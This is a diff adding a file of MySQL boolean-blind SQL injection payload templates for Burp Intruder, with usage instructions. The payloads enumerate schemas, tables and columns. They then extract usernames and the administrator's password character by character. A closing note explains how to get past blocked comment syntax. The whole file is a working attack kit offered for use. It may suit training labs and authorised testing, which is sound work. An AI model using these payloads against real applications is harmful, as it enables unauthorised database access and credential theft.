@@ -1,0 +1,60 @@
+# MySQL Boolean-Blind Intruder Templates
+# How to use:
+# - Paste a template into the vulnerable parameter value.
+# - Mark placeholders with Intruder markers §…§, then configure payload sets.
+# - Common placeholders:
+#   §N§  -> numeric threshold for length checks
+#   §POS§ -> 1-based character index
+#   §CUT§ -> ASCII threshold (for binary search)
+#   §OFFSET§ -> 0-based row index for enumeration
+#   §TABLE§ -> table name (string literal in the request, keep quotes)
+# - Recommended attack types:
+#   - Length/exists single variable: Sniper (N)
+#   - Binary search per position: Sniper (vary CUT; repeat per POS)
+#   - Equality brute-force: Cluster bomb (POS x ORD list if using equality set)
+# - Signal: True/false via response length/status/body diff. Add Grep - Extract on Content-Length or a stable marker.
+
+# --- Database/schema enumeration ---
+# Count exists (sanity check)
+' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- 
+# Schema name length (by row)
+' AND LENGTH((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Schema name char > CUT (binary search)
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Schema name char == literal (direct equality)
+' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Table enumeration (current DB) ---
+# Any tables in current database
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0-- 
+# Table name length (by row)
+' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Table name char > CUT
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Table name char == literal
+' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Column enumeration (specific table in current DB) ---
+# Column count for table
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='§TABLE§')>0-- 
+# Column name length (by ordinal/offset)
+' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Column name char > CUT
+' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Column name char == literal
+' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Username/password extraction (examples) ---
+# Enumerate usernames alphabetically
+' AND LENGTH((SELECT username FROM users ORDER BY username LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+' AND ASCII(SUBSTRING((SELECT username FROM users ORDER BY username LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+
+# Extract password for a given username
+' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>§N§-- 
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),§POS§,1))>§CUT§-- 
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§POS§,1)='a'-- 
+
+# Notes:
+# - Adjust names/columns as needed. If the parameter is not in a string context, remove the leading quote.
+# - If inline comments are blocked, try /* */ or change the spacing after --.
+
